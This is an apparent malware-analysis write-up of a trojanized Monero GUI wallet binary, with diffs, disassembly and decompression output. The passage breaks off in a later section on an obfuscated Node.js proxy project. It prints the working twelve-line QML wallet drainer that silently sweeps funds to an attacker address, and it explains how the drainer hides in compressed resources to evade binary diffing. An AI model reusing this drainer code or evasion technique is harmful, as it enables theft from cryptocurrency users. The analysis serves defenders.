The wallet second stage needed the two extra props from the wall list above: Intel SDE (`sde64 -spr`) to emulate the `-march=native` AVX-512 the build assumes, and software GL (`QT_QUICK_BACKEND=software`, `LIBGL_ALWAYS_SOFTWARE=1`, `GALLIUM_DRIVER=llvmpipe`) so the Qt GUI comes up headless. In this unattended run it stops at the setup wizard. A later human-in-the-loop run scripted past the wizard and ran into the deeper Monero wallet bug ([#8600](https://github.com/monero-project/monero/issues/8600)) covered in the detonation section above. What little did run before the wizard is itself a data point for the native-stock finding: it came up as Qt 5.15.19 on an 800x600 software surface and made one stock Monero DNS lookup, `updates.moneropulse.org` (the `checkpoints.moneropulse.org` host is a stock string in the binary but the run stops at the wizard before reaching it), with no operator domain, no onion, no TCP beacon, no eBPF, and no clipboard activity. The malice never executes in either run because it lives in the QML the sync callback runs after a funded, credited wallet is loaded, which the wizard never reaches here and #8600 prevents on the regtest chain. The captured DNS is the proof, not my say-so:

```
$ awk '{print $3}' wallet_v1/dns.log | grep -v '^$' | LC_ALL=C sort | uniq -c
     12 _ta-4a5c-4f66            # DNSSEC trust-anchor sentinel (RFC 8145): the system resolver, not the wallet
      4 updates.moneropulse.org  # stock Monero version check, the only application-level lookup
```

## the second stage {#second-stage}

The stealer's C2 serves a second-stage binary. It is a Linux `monero-wallet-gui`, the official Monero GUI wallet, rebuilt by the operator. The campaign drops it over the real one at `/usr/bin/monero-wallet-gui`.

A rebuilt crypto wallet binary that phones home reads like a miner at first glance. It is not a miner. It took decompressing the resource bundle to see what it actually is, and that is the rest of this post.

I had three samples that looked like distinct builds:

- v1: sha256 `47893d9badc38c54b71321263ce8178c1abb10396e0aadf9793e61ec8829e204`, 27,787,328 bytes, build-id `a92f892ea1d50a0240653d4e67c66ae0005c11c0`, a complete unstripped ELF
- v2: sha256 `6e4b611243aa2d261b17a61cd0aa9f3d51b30b8b66a64ead4c0696ae7025aea1`, 15,933,790 bytes
- v3: sha256 `92c40b92e909cd3dd505ea067f77218df00143e9a133a4463a26b217832ad8c0`, 20,516,912 bytes

and a stock reference pulled from the Arch Linux Archive: `monero-gui 0.18.5.0-3`, 17,552,112 bytes, build-id `35731917e94b5a38bee2eb61bcaa089c28308eb5`.

The sample at a glance:

```
File:      bin_linux.elf   (ELF 64-bit LSB PIE, x86-64)
Linking:   dynamic
Symbols:   NOT stripped     (which is why the C++ send-chain reads straight out by symbol below)
Size:      27,787,328 bytes
Entry:     0x285e10         BuildID a92f892ea1d50a0240653d4e67c66ae0005c11c0
Sections:  .text      0x110740  size 0xa6b603  (~10.4 MB, AVX-512 -march=native)
           .rodata    0xb81000  size 0xa01250  (~10.0 MB, holds the zlib-compressed QML = the drainer)
           .qtversion 0x1582250 size 0x10      (0x00050f13 = Qt 5.15.19)
           .bss       0x1711700 size 0xaa7c0
```

Structurally v1 is an ordinary Qt5 application. Four LOAD segments, and the third one, the 11 MB read-only segment, is where the resource bundle (and the QML) lives:

```
$ readelf -lW bin_linux.elf | grep LOAD     # cols: Offset VirtAddr FileSiz MemSiz Flg
LOAD 0x000000  0x000000  0x10be48 0x10be48 R    # headers + early rodata (1.0 MB)
LOAD 0x10c000  0x10c000  0xa74045 0xa74045 R E  # .text, the C++ code (10.4 MB)
LOAD 0xb81000  0xb81000  0xb37ee0 0xb37ee0 R    # rodata + Qt resources (11.2 MB) -> QML lives here
LOAD 0x16b9ca0 0x16b9ca0 0x057a60 0x102220 RW   # data + bss (MemSiz 0x102220 > FileSiz = .bss)

$ readelf -dW bin_linux.elf | grep -o 'libQt5[A-Za-z]*\.so\.5' | sed 's/\.so\.5//' | sort -u
libQt5Core libQt5Gui libQt5Network libQt5Qml libQt5QmlModels
libQt5Quick libQt5Svg libQt5Widgets libQt5Xml libQt5XmlPatterns
```

It links `libQt5Qml` and `libQt5Quick`, which is the whole reason the payload can live in QML and run: the binary ships a QML engine and feeds it the bundled resource at startup. Build comment is `GCC 16.1.1 20260430`, `Qt 5.15.19`, and the `.qtversion` section reads `0x00050f13`. Nothing in the segment layout is abnormal. The malice is content inside that third LOAD segment, not structure.

## the verdict I got wrong {#wrong-verdict}

I am going to lay this out the way it actually happened.

I did the diligent native-layer comparison. I pulled the stock `monero-wallet-gui 0.18.5.0` and diffed the sample against it every way I knew:

- Application exports: identical. Both export `__cxa_throw` and `mtrace`, nothing application-specific added.
- Imports: the wallet ships unstripped, so a raw symbol diff is dominated by linkage noise (1,394 undefined imports against stock's 1,255), not added capability. What matters is the exfil-capable surface, and none of it is new: `curl_*`, `dlopen`, and `system` are absent from both binaries, and the `socket`/`connect`/`execve` it does import are stock Monero networking (boost::asio and Monero's own `net` code), present in stock too.

  ```
  # "imports" = the dynamic symbol table. v1 is unstripped, so a plain `readelf -sW` also dumps
  # .symtab and doubles the count (2788); --dyn-syms (== nm -D) is the apples-to-apples import view.
  $ readelf --dyn-syms -W v1    | awk '$7=="UND"{print $8}' | wc -l
  1394
  $ readelf --dyn-syms -W stock | awk '$7=="UND"{print $8}' | wc -l
  1255

  # the exfil-capable libc surface is absent from BOTH (whole name, version suffix allowed):
  $ readelf --dyn-syms -W v1 | awk '$7=="UND"{print $8}' | grep -E '^(system|dlopen)(@|$)|^curl_'
  (no output -- neither v1 nor stock imports system, dlopen, or any curl_*)

  # what it DOES import is stock Monero networking, version-suffixed (so an exact ==socket misses it):
  $ readelf --dyn-syms -W v1 | awk '$7=="UND"{print $8}' | grep -E '^(socket|connect|execve|popen|fork)@'
  socket@GLIBC_2.2.5
  fork@GLIBC_2.2.5
  popen@GLIBC_2.2.5
  connect@GLIBC_2.2.5
  execve@GLIBC_2.2.5
  ```
- RTTI and type names: the sample is a strict superset of stock, and the extra entries are retained debug info for legitimate Monero internals. Zero stock symbols missing.
- Embedded URLs: every http(s) URL in the sample is also in stock (the getmonero hosts plus standard XML-namespace URLs from Qt and the like). Not one operator URL is added. The only code-level change is a p2pool dependency bump from v4.15 to v4.15.1, a real upstream release: the binary carries the expected-download SHA-256 `efd8b23579774711a5b86743da980e0936b7c220894063296719116d7f9ba254` next to the official `github.com/monero-project/p2pool/releases/download/v4.15.1/` URL, so the bump is genuine, not a swapped-in trojan p2pool.

  ```
  $ strings v1 | grep -cF 'p2pool/releases/download/v4.15.1/'                                # the official URL
  1
  $ strings v1 | grep -cF 'efd8b23579774711a5b86743da980e0936b7c220894063296719116d7f9ba254' # the expected sha256
  1
  ```
- Every exfil-capable import (`popen`, `fork`, `execve`, `socket`, `connect`, `PEM_write`) resolves through static cross-reference analysis to its normal stock caller. `popen` goes to the logging utility's `getBashOutput`, the sockets go to boost::asio and Monero's own net code. None of them is a wallet-key or send path.
- The obvious wallet-malware hypothesis, a clipboard hijacker that swaps a copied address for the attacker's, does not hold either. `QClipboard::setText` is present, but it resolves to the stock `clipboardAdapter` class behind the wallet's Copy and Paste buttons: a 52-byte wrapper. A real clipper is hundreds of bytes of regex-and-replace over clipboard content. The `seed` and `passphrase` strings are stock wallet UI. I ran that control specifically, because a rebuilt wallet that does not clip is itself a little odd, and it came back stock.

I even walked the whole transaction-send chain in the C++, because if a wallet binary were going to steal funds, that is where I would put it. The binary is unstripped, so the symbols are right there, and the chain is the stock chain at stock addresses:

```
# nm -C demangles; sed drops the long arg lists for readability, sort makes the order stable
$ nm -C bin_linux.elf | grep ' T ' | grep -E 'createTransaction|commitTransaction' | sed -E 's/\(.*//' | sort
0000000000300a40 T Wallet::createTransactionAll
0000000000307690 T Wallet::createTransaction
000000000030a8a0 T Wallet::createTransactionAsync            # GUI "Send" enters here
000000000030acd0 T Wallet::createTransactionAllAsync        # "sweep all" (the one the QML abuses)
000000000030afa0 T Wallet::commitTransactionAsync           # broadcast
000000000040ef10 T Monero::WalletImpl::createTransactionMultDest   # libwallet, builds the tx
000000000040fef0 T Monero::WalletImpl::createTransaction
```

The symbols are intact (the binary is unstripped), so `objdump -C` prints the demangled prototype, and the prologue shows the destination arriving as an argument, not a constant (the `<-` notes are mine):

```
$ objdump -d -C -M intel --start-address=0x30acd0 --stop-address=0x30ad11 bin_linux.elf | grep -E '^[0-9a-f]+ <|^ +[0-9a-f]+:' | sed -E 's/^ +//; s/\t+/  /g'
000000000030acd0 <Wallet::createTransactionAllAsync(QString const&, QString const&, unsigned int, PendingTransaction::Priority)>:
30acd0:  f3 0f 1e fa            endbr64
30acd4:  48 81 ec 88 00 00 00   sub    rsp,0x88
30acdb:  4c 89 64 24 68         mov    QWORD PTR [rsp+0x68],r12
30ace0:  49 89 fc               mov    r12,rdi                 <- this (the Wallet*)
30ace3:  4c 89 74 24 78         mov    QWORD PTR [rsp+0x78],r14
30ace8:  41 89 ce               mov    r14d,ecx                <- 3rd scalar arg (mixin / priority)
30aceb:  48 89 5c 24 58         mov    QWORD PTR [rsp+0x58],rbx
30acf0:  48 89 6c 24 60         mov    QWORD PTR [rsp+0x60],rbp
30acf5:  4c 89 6c 24 70         mov    QWORD PTR [rsp+0x70],r13
30acfa:  48 8b 2e               mov    rbp,QWORD PTR [rsi]     <- dst QString from arg rsi, NOT a .rodata constant
30acfd:  64 4c 8b 2c 25 28 00   mov    r13,QWORD PTR fs:0x28   <- stack canary
30ad04:  00 00 
30ad06:  4c 89 6c 24 48         mov    QWORD PTR [rsp+0x48],r13
30ad0b:  45 89 c5               mov    r13d,r8d
30ad0e:  8b 45 00               mov    eax,DWORD PTR [rbp+0x0] <- deref the caller's QString, never a constant
```

I disassembled each one. Every destination address comes from the function's `QString` arguments (the `rsi`/`rdx` parameters above), which trace back to GUI text fields. Zero hardcoded addresses loaded, zero foreign calls, no `0x865…` constant anywhere on the path. The native send code is the real Monero send code, untouched. So the place I expected a trojan to live was clean, which is exactly what reinforced the wrong call.

So I wrote it up: functionally stock, no trojan, high confidence. The size difference is fully explained by the sample being unstripped and `-march=native`. And that conclusion was wrong.

The reason it was wrong: the drainer never modifies any of those C++ functions. It calls `createTransactionAllAsync` (the stock sweep at `0x30acd0`) and `commitTransactionAsync` (the stock broadcast at `0x30afa0`) from QML, with the attacker address as the argument. Every function is legitimate. The malice is the QML caller that invokes them with no user in the loop, and QML is not in the symbol table.

It was wrong in a specific, instructive way. Everything I checked was true. The native ELF really is byte-stock Monero. My mistake was inferring "no payload" from "the native layer is clean" without checking the one place a Qt application hides its actual logic: the QML.

## decompressing the QML {#qml}

If every native layer is stock and the binary is still megabytes larger and rebuilt from source, the change has to be somewhere a native diff does not look. For a Qt application there is exactly one such place. A Qt application's UI and a lot of its behavior live in QML, and Qt packs QML into the binary as a resource bundle. Each QML and JS file is stored as an individual zlib stream inside `.rodata`, through the Qt RCC resource system. A byte-level ELF diff cannot see into a zlib stream. Neither can BinDiff, a symbol diff, or `strings`. They all slid right over the payload because the payload is compressed. That is exactly why every check I ran came back clean.

The simplest demonstration of the blind spot: grep the 27 MB ELF for the operator's drain address. It is what the payload sweeps funds to, and it is nowhere in the file as plaintext:

```
$ grep -oac 865BH8 bin_linux.elf       # the operator drain address
0
```

Zero. The address exists, but only after you inflate the zlib stream it lives in. Every plaintext scan, mine included, was looking at the compressed bytes and seeing noise.

A tempting second probe is to grep for the sweep call itself, `createTransactionAllAsync`. Do not trust what comes back:

```
$ grep -oa createTransactionAllAsync bin_linux.elf | wc -l
9
$ grep -oa createTransactionAllAsync stock/monero-wallet-gui | wc -l   # stock wallet, control
2
```

Nonzero, and nonzero in the clean stock wallet too. That is the trap. `createTransactionAllAsync` is a stock C++ symbol (`Wallet::createTransactionAllAsync`, the unstripped one I disassembled at `0x30acd0` above), so the name sits in the symbol table of every `monero-wallet-gui` ever built. The function being present tells you nothing about intent. What matters is who calls it and with what destination, and that call lives in the QML with the attacker address baked in. So the address is the honest tell, and it is the address that is absent from cleartext.

It generalizes, but the control has to be stated precisely or it does not survive a re-run. Broaden the search from the one drain address to any clean, isolated 95-character Monero base58 token:

```
$ strings -n 95 bin_linux.elf | grep -oE '\b[48][0-9A-HJ-NP-Za-km-z]{94,95}\b' | wc -l
0
```

Zero, but be exact about what that pipeline tests: a printable run of at least 95 characters (`strings -n 95`) that is also word-bounded (`\b`). Drop both filters and the count is not zero. A raw byte scan finds 99 base58-charset runs:

```
$ strings bin_linux.elf | grep -oE '[48][0-9A-HJ-NP-Za-km-z]{94,95}' | wc -l   # looser: no -n 95, no \b
99
$ strings bin_linux.elf | grep -oE '[48][0-9A-HJ-NP-Za-km-z]{94,95}' | sed -n 3p
405060708091011121314151617181920212223242526272829303132333435363738394041424344454647484950515
```

None of the 99 is an address. They are coincidental character runs in binary blobs, Qt resource data and a sequential-digit table like the one above, not Monero addresses. So I lean only on the narrow, robust claim: the operator's drain address `865BH8r1M2Ni6nckpNr357dqDYCC4VkoyeX7EReDmAkYWDnS646BgXeLmH8zcPr7ENbC9ZjzEXyD6ZDkYbfMjefx4aBZF8C` is absent from the cleartext bytes (the `grep -oac` above), and no isolated, word-bounded 95-char base58 token sits in the clear either. A clipboard hijacker or an address-swapper needs its destination somewhere in the clear to substitute it at runtime, and there is none here. The destination is in the compressed QML, invoked by the compressed QML, which is a different malware shape entirely.

```mermaid
flowchart TD
  subgraph rodata["ELF .rodata (what every scan reads)"]
    RS["qt_resource_struct<br/>(RCC file tree)"]
    RN["qt_resource_name<br/>(UTF-16BE names)"]
    RD["qt_resource_data"]
    RD --> M["main.qml → zlib stream"]
    RD --> W["Wizard.qml → zlib stream"]
    RD --> E["… 45 more → zlib stream"]
  end
  RD -.->|"strings / symbols / bytes / BinDiff all read: stock"| SCAN["ELF-level scan: CLEAN"]
  M ==>|"must inflate first"| INF["zlib-inflate"]
  INF ==> SRC["main.qml source → the drainer"]
  class RS,RN,RD,W,E stock;
  class M,INF inj;
  class SCAN no;
  class SRC eff;
  classDef stock fill:#1b1c13,stroke:#2e3020,color:#c9c9b8;
  classDef inj fill:#14150e,stroke:#b3bd33,color:#e2ddcd;
  classDef no fill:#14150e,stroke:#514f43,color:#989484;
  classDef eff fill:#14150e,stroke:#c97a6d,color:#e2ddcd;
```

So I expanded the resource bundle. The Qt RCC system stores three parallel tables in `.rodata`, and in this binary they sit at fixed offsets I could read directly:

```
Qt RCC tables in bin_linux.elf
  0xc3b580  qt_resource_struct   tree of nodes; file node = 22 bytes, big-endian,
                                 with a flags field (bit 0x1 = zlib-compressed)
  0xc3d100  qt_resource_name     UTF-16BE file names, each: u16 len, u32 hash, name
  0xc3fea0  qt_resource_data     u32 big-endian length prefix, then the zlib stream
            (size 0x54dacb)      each QML/JS file is its own zlib block here
  0x1196920 second resource set  the .qm translations (this is the tail v2/v3 lose)
```

I walked that tree node by node, resolved each name from the UTF-16 table, and for any node flagged compressed I read the `u32` length at the data offset and `zlib.decompress`'d the block. That reconstructs every embedded QML and JS file with its own hash. Then I ran an offset-independent diff against the stock wallet's bundle: decompress every zlib stream on both sides, normalize whitespace, compare the sets. No execution, pure `struct` plus `zlib`.

The result is clean and damning:

```
$ python3 qml_fulldiff.py stock/monero-wallet-gui bin_linux.elf
[*] scanning STOCK : stock/monero-wallet-gui  -> 47 distinct QML/JS streams
[*] scanning SAMPLE: bin_linux.elf            -> 47 distinct QML/JS streams
[*] streams in SAMPLE not byte-matching any STOCK stream: 1
==============================================================================
CHANGED STREAM #1  (import QtQml.Models 2.2 / id: appWindow)
  contains drain signature (createTransactionAllAsync + balanceAll + 865BH8): True
  closest stock stream similarity: 0.997
  lines added in sample: 12 | removed: 0
    +
    +        if (walletSynced && currentWallet && !currentWallet.viewOnly) {
    +            var total    = currentWallet.balanceAll();
    +            var unlocked = currentWallet.unlockedBalanceAll();
    +            if (total > 1 * 1e12 && unlocked > total / 2) {
    +                currentWallet.heightRefreshed.disconnect(onHeightRefreshed);
    +                currentWallet.transactionCreated.connect(function(tx) {
    +                    currentWallet.commitTransactionAsync(tx);
    +                });
    +                currentWallet.createTransactionAllAsync("865BH8r1M2Ni6nckpNr357dqDYCC4VkoyeX7EReDmAkYWDnS646BgXeLmH8zcPr7ENbC9ZjzEXyD6ZDkYbfMjefx4aBZF8C", "", 15, 0);
    +            }
    +        }
```

47 QML/JS streams in stock, 47 in the sample. Exactly one differs. It is `main.qml`, similarity to stock `0.997`. The diff is `+12 / -0`. Twelve lines added, nothing removed, nothing else in the entire UI changed.

The twelve lines are appended to `onHeightRefreshed`, the callback that fires every time the wallet's blockchain sync height advances. In stock it ends at `onWalletUpdate();`. The sample appends this:

```javascript
if (walletSynced && currentWallet && !currentWallet.viewOnly) {
    var total    = currentWallet.balanceAll();
    var unlocked = currentWallet.unlockedBalanceAll();
    if (total > 1 * 1e12 && unlocked > total / 2) {
        currentWallet.heightRefreshed.disconnect(onHeightRefreshed);
        currentWallet.transactionCreated.connect(function(tx) {
            currentWallet.commitTransactionAsync(tx);
        });
        currentWallet.createTransactionAllAsync("865BH8r1M2Ni6nckpNr357dqDYCC4VkoyeX7EReDmAkYWDnS646BgXeLmH8zcPr7ENbC9ZjzEXyD6ZDkYbfMjefx4aBZF8C", "", 15, 0);
    }
}
```

That is the whole payload. Twelve lines of QML. It is a Monero wallet drainer: when a synced, spendable wallet holding more than 1 XMR is opened, it sweeps the entire balance to `865BH8r1M2Ni6nckpNr357dqDYCC4VkoyeX7EReDmAkYWDnS646BgXeLmH8zcPr7ENbC9ZjzEXyD6ZDkYbfMjefx4aBZF8C` and auto-broadcasts, with no dialog and no second chance.
{:.callout-key}

On whether this is a new technique, because it is worth being honest about: hiding the payload in the QML resource layer is a new carrier for an old idea, not a new idea. Trojanizing the interpreted or resource layer of an app to slip past native-code analysis is well-precedented. Backdoored Electron apps hide JavaScript inside the [`app.asar` archive](https://www.intego.com/mac-security-blog/osx-amos-hunting-c2s-in-trojanized-electron-asar-payloads/), sometimes tampering with the ASAR header to fool static parsers. Lua-based loaders like [LucidRook](https://blog.talosintelligence.com/new-lua-based-malware-lucidrook/) keep their logic in bundled scripts behind a thin native stub. The closest cousin in intent is the [2019 GetMonero compromise](https://web.getmonero.org/2019/11/19/warning-compromised-binaries.html), which injected wallet-theft logic into a legitimate Monero build, except it did so in native C++, which is exactly what binary diffing was built to catch. What I did not find a public prior example of is this done in Qt QML specifically. So the new part is the substrate, not the method: the same resource-layer evasion, in a carrier that had not been written up.

And to close the other obvious door: a lot of recent crypto-drainers live in the JS layer, swapping a destination or beaconing out with `fetch`/`XMLHttpRequest`. This one does not. The decompressed JS and QML carry none of those primitives:

```
$ grep -rhcE 'XMLHttpRequest|fetch\(|WebSocket|atob|btoa|eval\(' qml_extracted/ | paste -sd+ | bc
0
$ grep -rhoE '0x[0-9a-fA-F]{40}' qml_extracted/ | wc -l        # any ETH address?
0
$ grep -rl createTransactionAllAsync qml_extracted/            # which files call the sweep?
qml_extracted/main.qml
```

No network primitive, no base64 decode, no `eval`, no ETH address, and `createTransactionAllAsync` appears in exactly one file. The JS-swap and clipboard-beacon shapes are both ruled out. The entire malicious surface is the twelve QML lines.

I verified it the way I should have verified the native layer the first time: carve `main.qml` out of the raw ELF with a zlib-and-hashlib script, no execution, then compare the sample against stock. The output side by side:

```
$ python3 carve_mainqml.py v1 v2 stock

### bin_linux.elf  (27,787,328 bytes)
  main.qml zlib@0xc4194a usize=97914 sha256=ce8ecab937cf7109f3b344782cd1cbad680d4477965b235b0a59ce888986c4eb
           has_865BH8=True  n_createTxAll=2
  drain block (if(walletSynced)...close): len=663 sha256=488699593ea4bfe487d3464924be136af69cd1403494d0373bdba2fd1eac2d3b

### bin_linux_6e4b611243aa2d26.elf  (15,933,790 bytes)
  main.qml zlib@0xc4194a usize=97914 sha256=ce8ecab937cf7109f3b344782cd1cbad680d4477965b235b0a59ce888986c4eb   (byte-identical to v1)
           has_865BH8=True  n_createTxAll=2
  drain block (if(walletSynced)...close): len=663 sha256=488699593ea4bfe487d3464924be136af69cd1403494d0373bdba2fd1eac2d3b   (byte-identical to v1)

### monero-wallet-gui  (17,552,112 bytes)
  main.qml zlib@0x7df0c8 usize=97241 sha256=5007f0bb9b579176a66430d935192762490df9e87151ceaaa9201491520c4086
           has_865BH8=False  n_createTxAll=1
```

Read the negative control row. Stock has `has_865BH8=False` and exactly one `createTransactionAllAsync` call site (the legitimate user-send). The sample has the address present and two call sites: the real send, plus the injected sweep. These `n_createTxAll` counts (2 in the sample, 1 in stock) are QML call sites inside the decompressed `main.qml`, which is why they differ from the 9-versus-2 raw-ELF grep earlier: that one counted symbol-table occurrences of the C++ method, this one counts who actually invokes it in the UI. The drain block is byte-identical across both sample copies. The string `865BH8` appears nowhere in the entire stock binary.

Two independent methods agree on the `+12`. The full-diff says one file changed by twelve lines. And the only other `createTransactionAllAsync` call site, the legitimate user-driven send, sits at line 962 in stock and line 974 in the sample. 974 minus 962 is 12. The line shift is exactly the injected block and nothing else moved.

## what createTransactionAllAsync actually does {#sweep-all}

The behavior reads cleanly off the code once you know the Monero API.

```mermaid
flowchart TD
  HR["heightRefreshed (fires on every sync-height advance)"] --> OW["onWalletUpdate() (stock, unchanged)"]
  OW --> G1{"walletSynced and not viewOnly ?"}
  G1 -->|no| X1["do nothing"]
  G1 -->|yes| G2{"balanceAll over 1 XMR<br/>and unlocked over total/2 ?"}
  G2 -->|no| X2["do nothing"]
  G2 -->|yes| D["heightRefreshed.disconnect(self)<br/>arm ONCE, never re-enter"]
  D --> C["transactionCreated to commitTransactionAsync<br/>auto-broadcast, NO dialog"]
  C --> S["createTransactionAllAsync(ATTACKER_ADDR, '', 15, 0)<br/>'' paymentId · 15 ring · 0 priority<br/>no amount arg = sweep all unlocked"]
  S --> R["entire unlocked balance leaves to 865BH8r1M2Ni6nckpNr357dqDYCC4VkoyeX7EReDmAkYWDnS646BgXeLmH8zcPr7ENbC9ZjzEXyD6ZDkYbfMjefx4aBZF8C<br/>(victim sees no prompt)"]
  classDef inj fill:#14150e,stroke:#b3bd33,color:#e2ddcd;
  classDef stock fill:#1b1c13,stroke:#2e3020,color:#c9c9b8;
  classDef no fill:#14150e,stroke:#514f43,color:#989484;
  class D,C,S,R inj;
  class HR,OW,G1,G2 stock;
  class X1,X2 no;
```

The block fires on every sync height refresh, but the inner guard only triggers when the wallet is synced, spendable (not view-only), holds more than 1 XMR (`1 * 1e12` piconero), with the majority of the balance unlocked (`unlocked > total / 2`). When that is true it does three things. It disconnects itself from `heightRefreshed` so it fires exactly once and does not re-enter. It wires `transactionCreated` to `commitTransactionAsync`, which auto-broadcasts the transaction the instant it is built, with no confirmation dialog. Then it calls `createTransactionAllAsync` with the attacker's address.

`createTransactionAllAsync` is the stock wallet's own "send all" function. The four arguments are the destination address, the payment ID (empty here), the ring/mixin count (`15`), and the priority (`0`, automatic). The legitimate user-driven send in the same file calls it with exactly that shape, `createTransactionAllAsync(recipientAll.address, paymentId, mixinCount, priority)` at `main.qml:974`. The injected call is the same line with the address hardcoded to the attacker and the payment ID blanked. There is no amount argument at all, and that is the point: the `All` variant maps, at the libwallet level, to `createTransactionMultDest` with the amounts optional left empty, which is Monero's sweep-all, build a transaction that spends the entire unlocked balance to the single destination. The injected code is not calling some custom drain primitive. It is calling the wallet's legitimate sweep function with a hardcoded destination and then auto-confirming it. That is why the native layer is clean. Every function the drainer uses is a real Monero GUI function. The malware only adds the QML that invokes them, with the attacker's address and no user in the loop.

The block is wired in through a stock signal, not a new one. `onHeightRefreshed` is the wallet's own height-refresh handler, defined at `main.qml:729` and connected at `main.qml:356` with `currentWallet.heightRefreshed.connect(onHeightRefreshed)`, both unchanged from stock. That handler already runs on every sync-height advance to update the UI. The drainer just appends its twelve lines to the bottom of it, so the sweep rides a signal the wallet was always going to fire. Nothing in the injected code creates a timer, a new connection, or a visible trigger, which is part of why a C++ or symbol-level diff sees nothing.

So: a victim restores or opens a wallet with real funds. It syncs. The moment sync completes and the balance is spendable, the entire balance leaves to the attacker, broadcast automatically, with no prompt. Once.

One boundary, stated here and not buried: that sequence is read off the code, not filmed. I proved it statically, the injected QML plus the documented sweep-all semantics plus the negative control against the clean wallet, and I am confident in it. I did not get a funded, synced wallet in front of the live build to watch the coins move, because the binary gets stuck in the setup wizard under emulation (see the detonation section). The logic does not need the demo to be sound, but I am not going to write "I watched it drain" when what I did was read exactly what it will do.

## the drain address {#drain-address}

The destination every injected sweep points at is one Monero address, hardcoded, byte-identical across every copy of the build. Here it is in full:

```
865BH8r1M2Ni6nckpNr357dqDYCC4VkoyeX7EReDmAkYWDnS646BgXeLmH8zcPr7ENbC9ZjzEXyD6ZDkYbfMjefx4aBZF8C
```

I validated it rather than assuming. Monero base58 decodes in 11-character blocks (eight bytes each, five for the short trailing block) to 69 bytes: one network byte, a 32-byte spend public key, a 32-byte view public key, and a four-byte checksum. The checksum is the first four bytes of the keccak-256 of the other 65. I decoded and checked it read-only:

```
$ python3 decode_xmr_addr.py 865BH8r1M2Ni6nckpNr357dqDYCC4VkoyeX7EReDmAkYWDnS646BgXeLmH8zcPr7ENbC9ZjzEXyD6ZDkYbfMjefx4aBZF8C
net byte     : 42                       (0x2a = Monero MAINNET subaddress)
spend pubkey : 5f829e36780d8ff5b82e0bb070b6cedc3335773c5cb760e04fdf99744b6061ae
view  pubkey : b286cfd30dcded762862a91a6cc987cc6bfbfea299923dc0a13d5f197f71971f
checksum     : a95b1d99
keccak256(first 65 bytes)[:4] : a95b1d99   -> VALID
```

Network byte 42 is a mainnet subaddress, and the keccak checksum matches, so it is not a typo or a decoy. It is a real, spendable address with valid spend and view keys.

And here is the uncomfortable part about quantifying the damage. Monero is private by design. There is no explorer where you can look up this address's balance or its inflows. The total stolen is not knowable by me or by anyone who is not the operator. The address has zero public footprint otherwise, which I confirmed against a sentinel (a known-indexed scam address) so I know my OSINT tooling actually finds addresses when they are findable.

## truncation, not rotation {#truncation}

I owe a second correction here, smaller than the QML one but worth it.

I initially treated v1, v2, and v3 as three rotating builds of the second stage, as if the operator was cycling binaries to dodge hash-based detection. They are not three builds. There is one binary, v1, the complete 27,787,328-byte ELF. v2 and v3 are truncated downloads of v1, cut off mid-transfer over Tor.

The proof is exact. Hash the first N bytes of v1 and you get the other two "variants":

```
$ python3 -c 'import hashlib; v1=open("v1","rb").read()
  print(hashlib.sha256(v1[:15933790]).hexdigest())
  print(hashlib.sha256(v1[:20516912]).hexdigest())'
6e4b611243aa2d261b17a61cd0aa9f3d51b30b8b66a64ead4c0696ae7025aea1   == v2
92c40b92e909cd3dd505ea067f77218df00143e9a133a4463a26b217832ad8c0   == v3
```

They look stripped because truncation lops off the section-header table, and the SHT lives at the very end of the file, past both cut points. The numbers line up exactly:

```
v1 e_shoff (section-header table offset) : 27,785,024
v1 filesize                              : 27,787,328   (e_shoff + 36 headers * 64 B, exactly)
v2 cut at 15,933,790   < 27,785,024  -> SHT gone -> readelf -S shows 0 sections -> "stripped"
v3 cut at 20,516,912   < 27,785,024  -> same
drain QML zlib stream  @ 0xc4194a = 12,851,530  < both cuts  -> drainer intact in every copy
```

They share a build-id only because the `.note.gnu.build-id` sits near the start, which every prefix keeps. The "active rotation" story was a partial-download artifact, and my dedup-by-hash got fooled by incomplete fetches. v3 was never retained as a file, but because its recorded hash equals `sha256(v1[:20516912])` exactly, and that cut point is past the drainer, v3 provably carries the same payload. There is one binary. The drainer rides in the shared prefix of all three lengths, which is also why decompressing the truncated v2 had given the byte-identical `main.qml` earlier: v2 is just v1's opening bytes.

## the side hustle: proxy resale and a cloudflare tunnel {#proxy}

There is a second operation hanging off the same actor, separate from the AUR payload. A Node.js project, a fork of the public `eooce/nodejs-argo`, published as a container at `ghcr.io/fardewoak/herbsobering430`. The `index.js` is obfuscator.io output with two layers stacked. The outer layer is the string-array-rotate self-defense: every literal is replaced by a `_0x….(index)` call into one array of 544 entries, and an IIFE at the top spins that array (shift-and-push) until a `parseInt` over a few decoded entries equals a hardcoded magic, so the array only lands in the right order once its own decoder has already run. The inner layer is the per-entry encoding, and despite looking like keyed ciphertext it is just custom-alphabet base64.

Here is what that looks like on disk. The whole file is one physical line. The head is the rotation IIFE and two index-munging wrappers that front the decoder, every literal already gone:

```javascript
// index.js:1  (obfuscator.io output, one line, wrapped here for reading)
(function (_0x50ad2b, _0x1d15b1) {
  const _0x3c8f88 = _0x50ad2b();                                  // = _0x3da7(), the 544-entry array
  function _0x285fd8(a, b, c, d) { return _0xdb39(c - -0x91, a); } // wrapper -> accessor
  function _0x4a8c22(a, b, c, d) { return _0xdb39(b - 0x1a5, c); } // wrapper -> accessor
  while (!![]) { try {
      const _0xbb5a0a = parseInt(_0x285fd8(...)) / ... * parseInt(_0x4a8c22(...)) / ... + ...;
      if (_0xbb5a0a === _0x1d15b1) break;                         // hit the magic -> array is ordered
      _0x3c8f88['push'](_0x3c8f88['shift']());                    // else rotate one slot and retry
  } catch (_) { _0x3c8f88['push'](_0x3c8f88['shift']()); } }
}(_0x3da7, -0x33164 + -0xcbae4 + 0x1d7d4e));                      // _0x1d15b1 = 889094, the magic
```

The array it spins, `_0x3da7()`, is 544 custom-base64 blobs that each read as keyed ciphertext at a glance:

```javascript
// index.beautified.js:656
function _0x3da7() {
  const _0x1fa417 = ['E30Uy29UC3rYDwn0B3iOiNjLDhvYBIb0AgLZiIKOicK', 'tNrcqMy', 's2rir3C', 'ndqZ', /* ...540 more... */];
  _0x3da7 = function () { return _0x1fa417; }; return _0x3da7();
}
```

Deobfuscating it had one hard rule. The AST tools (`webcrack`, `synchrony`, `restringer`) do not statically evaluate that array-rotation, they run it: `node:vm` is a language sandbox, not a security boundary, so executing the sample's own decoder is executing attacker code. I ran that chain inside a sealed container (`--network none`, no host mounts, caps dropped), never on the host. Then, so I would not have to trust the sandbox output, I reimplemented the inner decoder in pure Python and resolved all 544 strings without executing anything. The whole inner decode is a few lines once you lift the alphabet out of the decoder body:

```python
# the permuted base64 alphabet, read verbatim from index.beautified.js:2941
